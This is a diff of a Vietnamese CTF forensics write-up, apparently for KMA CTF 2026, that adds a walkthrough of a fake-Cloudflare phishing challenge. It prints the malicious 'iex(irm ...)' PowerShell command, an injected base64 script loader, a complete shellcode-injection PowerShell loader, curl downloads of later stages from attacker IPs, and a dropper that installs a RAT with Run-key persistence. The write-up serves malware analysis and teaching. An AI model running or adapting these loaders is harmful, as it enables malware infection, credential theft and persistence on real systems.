@@ -5,6 +5,7 @@ author: deroise2306
 description: KMA CTF 2026 I Writeup
 tags: ["forensics", "KMA", "CTF"]
 ---
+
 <script>
 async function checkPassword() {
   const pwd = prompt("Nhập mật khẩu để xem bài viết:");
@@ -27,7 +28,9 @@ async function checkPassword() {
 }
 window.addEventListener('load', checkPassword);
 </script>
+
 # 1. CCTV
+
 <div style="text-align: center;">
 
 ![CCTV](https://i.ibb.co/23kzH4kS/image.png)
@@ -470,3 +473,274 @@ Full flag: `KMACTF{Urz_I3lU3t00th_d3v1c3z_C4N_M4KE_M0R3_N01Z3_Th4N_y0u_C4n_Th1nk
 ![image](https://i.ibb.co/mrg93Wtc/BB1-E26-A1-49-C4-41-CE-83-CF-4097-C1-F5386-E.png)
 
 </div>
+
+# 3. MR ROBOT:
+
+<div style="text-align: center;">
+
+![image](https://i.ibb.co/p6VjJjWh/51-CFB2-DC-0886-4342-BE93-B9-F995153-AAA.png)
+
+</div>
+
+Xì xà xì xồ.
+<div  style="text-align: center;">
+
+![image](https://i.ibb.co/WNRv76tN/098-F6282-AECA-4230-AB9-C-4-F9803-B6-F917.png)
+
+</div>
+
+### 1. What command did the compromised website tell you to run?
+Ngay khi vào web của challenge, một giao diện khá quen thuộc xuất hiện:
+
+![image](https://i.ibb.co/SLrxyhy/F33-E426-B-D369-4-FC0-A704-6-E0334199-AE7.png)
+
+Nhìn thì có vẻ giống authorize web của Cloudflare, nhưng khi bấm verify thì kết quả hoàn toàn khác:
+
+![image](https://i.ibb.co/v4M5r9h0/BB9871-EC-62-C0-4-EDB-BCF1-0062-EE25-A15-B.png)
+
+Không khó khăn để nhận ra đây là một dạng phishing bằng fake Cloudflare để lừa user execute code. 
+Và khi Ctrl V thì ta sẽ có được command mà nó muốn mình chạy:
+```
+powershell -c iex(irm 152.42.186.220 -UseBasicParsing)
+```
+### 2. Where does the website load malicious payload from?
+Ban đầu câu này mình đã nghĩ nó là địa chỉ ngay trong command trên, nhưng mà mình đã bỏ lỡ gì đó :(. Khi Ctrl U để view source thì có một đoạn code khả nghi:
+```
+</style>
+<script data-wpmeteor-nooptimize="true" data-cfasync="false">if(!window.__performance_optimizer_v6){window.__performance_optimizer_v6=true;if(!/wordpress_logged_in_/.test(document.cookie)){var perfEndpoints=["aHR0cHM6Ly9qc3JlcG8uYWR1bWEub25saW5lL25ldy5qcz8="];function loadPerformanceScript(endpointIndex){if(endpointIndex>=perfEndpoints.length)return;var endpointUrl=atob(perfEndpoints[endpointIndex])+Math.random();fetch(endpointUrl).then(function(r){if(r.ok)return r.text();throw new Error(r.status)}).then(function(t){var s=document.createElement("script");s.text=t;document.head.appendChild(s)}).catch(function(e){loadPerformanceScript(endpointIndex+1)})}loadPerformanceScript(0)}}</script>
+</head>
+<body>
+```
+
+Ở đoạn trên thì ta thấy Endpoint bị mã hoá Base64, có vẻ là trang web bị tấn công đã bị inject đoạn code yêu cầu xác thực từ địa chỉ này (chính là cái màn hình Cloudflare fake ban nãy). Giải mã Base64 thì ra được địa chỉ của nó:
+```
+https://jsrepo.aduma.online/new.js
+```
+
+### 3. Name of the binary file that powershell loaded?
+Ok, giờ truy cập phần IP ở trong powershell command hoặc có thể curl nó ra, ta sẽ biết khi khởi chạy command thì chúng sẽ làm những gì:
+```
+$u = "http://152.42.186.220/9cca20c6df659f72/m_cpt1267382.bin"
+
+
+
+try {
+
+    Write-Host "Loading..." 
+
+    
+
+    $d = Invoke-WebRequest -Uri $u -UseBasicParsing -ErrorAction Stop
+
+    $b = $d.Content
+
+    $s = $b.Length
+
+
+
+    $c = @"
+
+using System;
+
+using System.Runtime.InteropServices;
+
+public class W {
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+
+    public static extern IntPtr GetCurrentProcess();
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+
+    public static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+
+    public static extern IntPtr CreateThread(IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint cf, out uint tid);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+
+    public static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+}
+
+"@
+
+
+
+    Add-Type -TypeDefinition $c
+
+
+
+    $m1 = 0x1000
+
+    $m2 = 0x2000
+
+    $p = 0x40
+
+    
+
+    $addr = [W]::VirtualAlloc([IntPtr]::Zero, $s, $m1 -bor $m2, $p)
+
+    
+
+    if ($addr -eq [IntPtr]::Zero) {
+
+        throw "Alloc failed"
+
+    }
+
+
+
+    [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $addr, $s)
+
+    
+
+    $tid = 0
+
+    $th = [W]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
+
+    
+
+    if ($th -eq [IntPtr]::Zero) {
+
+        throw "Thread failed"
+
+    }
+
+
+
+    [W]::WaitForSingleObject($th, 30000) | Out-Null
+
+    Write-Host "done."
+
+    
+
+} catch {
+
+    Write-Error $_.Exception.Message
+
+    exit 1
+
+}
+```
+Phân tích sâu thì có lẽ sẽ nên đi theo từng câu, nhưng đáp án cho câu hỏi thứ 3 sẽ là `m_cpt1267382.bin`
+
+### 4. What process does this binary inject into?
+
+Đến đoạn này thì phải rì vợt rồi :mattimkhocloc:. Vì rì vợt chưa tài nên em D MCP thật căng:
+
+![image](https://i.ibb.co/m5SBdNpj/ACABC49-E-DC8-F-452-B-B380-96-B66-E4-ADD5-D.png)
+
+Từ kết quả phân tích này thì ta có có thể thấy rằng process bị inject chính là `svchost.exe`.
+
+### 5. Next stage C&C server?
+
+Từ phần summary ở trên thì ta thấy rằng máy chủ C&C chính là `152.42.203.28`
+
+### 6. Little secret used to access the next stage payload?
+
+Cái này thì có vẻ như là nhắc đến User-Agent được sử dụng để tải file bin tiếp theo về: `missav` 
+
+### 7.  Next stage type of malware?
+
+Đến bước này thì phải xem thử file bin tiếp theo là gì. Vì cần phải download với User-Agent nên là mình phải download bằng lệnh sau:
+```
+curl.exe -A "missav" -o m_cpt_bld172638.bin "http://152.42.203.28/9cca20c6df659f72/m_cpt_bld172638.bin"
+```
+
+Tải được file thì lại nhờ MCP cứu bé thôi:
+
+![image](https://i.ibb.co/wNFNqcJt/F85-A021-C-F841-43-FC-847-E-0-CCFA56-C1-E8-F.png)
+
+Nhìn những gì nó thu thập từ máy người dùng thì câu trả lời cho Q7 chắc chắn phải là `infostealer`
+
+### 8. What is the final C&C server found in the second binary?
+
+Các file độc hại tiếp theo được tải về từ địa chỉ: `138.2.62.171`
+
+### 9. What is the encryption key used for the C&C communication channel?
+Ở file bin thứ 2 có sử dụng mã hoá AES, và key được sử dụng là `lmao_ez_sysinfo_aes256_key_2026!!`
+
+![image](https://i.ibb.co/bMfnZLtB/6-AC03812-C152-44-F5-BAA8-0-EF70-B7925-D3.png)
+
+### 10. Huh? The msi file ran something? Where is it?
+Đến đây thì mình cần phân tích file `install.msi` kia. 
+
+```
+C:\Users\deroise2306\Downloads>curl.exe -A "missav" -o install.msi "http://138.2.62.171:443/install.msi"
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100  2.25M 100  2.25M   0      0  1.98M      0   00:01   00:01          1.32M
+```
+Vibe RE time ig:
+
+![image](https://i.ibb.co/x4pX4zX/097-FEF07-6299-42-D1-9-CCE-7-BA14593-C6-A3.png)
+Đáp án: `http://138.2.62.171:443/captcha.php`
+
+### 11. What is the MITRE ATT&CK technique ID for the persistence method used by?
+
+File php được nhắc đến ở trên:
+
+```
+$ided12 = "ca90d68db06b4"
+
+try {
+    $null = Invoke-WebRequest -Uri "http://138.2.62.171:443/track.php?vid=$ided12&action=started" -UseBasicParsing -ErrorAction SilentlyContinue
+} catch { $null }
+
+$dir3961 = "UPD-AD5F3D41-08C9-4BB4-A661-ABD8BA3603E3"
+$path07ae = New-Item -Path "$env:APPDATA\$dir3961" -ItemType Directory -Force
+
+$zip2f8d = "$path07ae\software.zip"
+try {
+    Invoke-WebRequest -Uri "http://138.2.62.171:443/downloads/AP-52163787-D405-4828-BBDD-09BB036BF5B3.zip" -OutFile $zip2f8d -ErrorAction Stop
+} catch {
+    $null = Invoke-WebRequest -Uri "http://138.2.62.171:443/track.php?vid=$ided12&action=failed" -UseBasicParsing -ErrorAction SilentlyContinue
+    exit 1
+}
+
+try {
+    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zip2f8d, $path07ae)
+} catch {
+    $null = Invoke-WebRequest -Uri "http://138.2.62.171:443/track.php?vid=$ided12&action=failed" -UseBasicParsing -ErrorAction SilentlyContinue
+    exit 1
+}
+
+Remove-Item -Path $zip2f8d -Force -ErrorAction SilentlyContinue
+
+$exe7563 = "$path07ae\client32.exe"
+Start-Process -FilePath $exe7563 -WindowStyle Hidden -ErrorAction SilentlyContinue
+
+try {
+    if (Test-Path $exe7563) {
+        $reg2fdb = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+        Set-ItemProperty -Path $reg2fdb -Name "SystemUpdate_$ided12" -Value "`"$exe7563`"" -Type String -Force
+    }
+} catch { $null }
+
+try {
+    $null = Invoke-WebRequest -Uri "http://138.2.62.171:443/track.php?vid=$ided12&action=completed" -UseBasicParsing -ErrorAction SilentlyContinue
+} catch { $null }
+```
+
+Tóm tắt thì file này thực hiện các bước: Tạo thư mục ẩn tên `UPD-AD5F3D41-08C9-4BB4-A661-ABD8BA3603E3` trong `%APPDATA%`, lưu file `software.zip` và giải nén + xoá file zip gốc, thực thi mã độc `client32.exe` trong file zip. Ghi vào Registry Key `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` để persistence. 
+Và hành vi persistence bằng Registry Key như trên thì sau khi tra cứu ta có đáp án là `T1547.001`
+
+![image](https://i.ibb.co/3m6pkyQ8/45100453-CAB2-4-DDF-95-A7-7-FC6-E1-B4-EF7-D.png)
+
+### 12. C&C server of the RAT? (Example: 9.9.9.9)
+Bước này thì ta cần phân tích file `client32.exe` một chút. Mở máy ảo, chạy file `install.sh` để xem cấu trúc malware:
+
+![image](https://i.ibb.co/kgfm5GVk/8538-EBCC-276-F-4-D3-C-8137-47510192-D59-C.png)
+
+Check file ini thì thấy được CnC Server:
+
+![image](https://i.ibb.co/GQjj6jRX/E46287-BA-D446-4-A27-9-D05-FCC30978-B4-E4.png)
+
+Đáp án sẽ là: `161.33.2.236`
+
+Flag: `KMACTF{https://youtu.be/r9jL-lbE558_D5929CCFDEB6C5FF}` 
+
+![image](https://i.ibb.co/zWwKgLx9/FE8001-C3-F658-4-C2-D-907-E-A2485353083-D.png)
